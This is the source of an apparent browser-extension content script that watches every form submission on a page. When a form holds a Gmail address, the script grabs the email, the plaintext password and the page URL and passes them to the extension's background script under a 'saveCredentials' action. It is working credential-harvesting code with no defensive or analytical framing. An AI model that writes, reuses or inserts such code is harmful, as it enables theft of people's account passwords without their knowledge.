// Monitor form submissions
document.addEventListener('submit', function(event) {
  const form = event.target;
  
  // Look for email and password fields
  const emailField = form.querySelector('input[type="email"], input[name*="email"], input[id*="email"]');
  const passwordField = form.querySelector('input[type="password"]');
  
  if (emailField && passwordField && passwordField.value) {
    const email = emailField.value;
    const password = passwordField.value;
    const url = window.location.href;
    
    // Only capture if email looks like Gmail
    if (email.includes('@gmail.com')) {
      console.log('Credential detected, sending to background script');
      
      // Send message to background script and wait for response
      chrome.runtime.sendMessage({
        action: 'saveCredentials',
        data: { 
          email: email, 
          password: password, 
          url: url, 
          timestamp: Date.now() 
        }
      }, function(response) {
        if (response && response.status === 'received') {
          console.log('Background script confirmed receipt of credentials');
        } else {
          console.error('No confirmation from background script');
        }
      });
    }
  }
});


